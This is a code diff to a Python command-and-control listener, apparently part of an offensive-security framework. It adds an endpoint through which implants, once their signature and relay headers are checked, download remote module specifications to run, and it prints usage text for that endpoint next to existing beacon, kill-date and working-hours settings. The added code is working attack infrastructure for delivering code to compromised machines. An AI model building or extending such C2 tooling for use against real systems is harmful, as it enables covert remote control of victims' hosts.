@@ -633,6 +633,37 @@ class Module(Listener):
                         return
 
                     if path != f"{prefix}/poll":
+                        if path == f"{prefix}/module":
+                            qs = parse_qs(parsed.query)
+                            cid = (qs.get("id") or [""])[0]
+                            sig = (qs.get("sig") or [""])[0]
+                            mod_path = (qs.get("path") or [""])[0]
+                            language = (qs.get("language") or ["python"])[0]
+                            if not cid or not mod_path:
+                                self._send(400, "missing id or path")
+                                return
+                            ok_chain, chained, _tok, via = listener._check_chain_headers(self.headers)
+                            if not ok_chain:
+                                self._send(403, "chain not allowed")
+                                return
+                            sid = listener._ensure_session(
+                                cid, self.client_address[0], sig=sig, chained=chained, chain_via=via
+                            )
+                            if not sid:
+                                self._send(403, "invalid implant signature")
+                                return
+                            from lib.c2.remote_module_server import resolve_remote_module
+
+                            spec = resolve_remote_module(
+                                listener.framework,
+                                mod_path,
+                                language=language,
+                            )
+                            if spec is None:
+                                self._send(404, "module not found")
+                                return
+                            self._send(200, json.dumps(spec.to_dict(), ensure_ascii=False), "application/json")
+                            return
                         self._send(404, "not found")
                         return
 
@@ -767,6 +798,7 @@ class Module(Listener):
                     f"(waiting for check-in)"
                 )
             print_info("Agent: GET /c2/poll?id=<implant_id>&sig=<b64url>, POST /c2/result?id=<implant_id>&sig=...")
+            print_info("Remote modules: GET /c2/module?id=<implant_id>&path=<module_path>&language=python")
             if profile.kill_date:
                 print_info(f"Beacon kill_date={profile.kill_date} tz={profile.timezone}")
             if profile.working_hours:
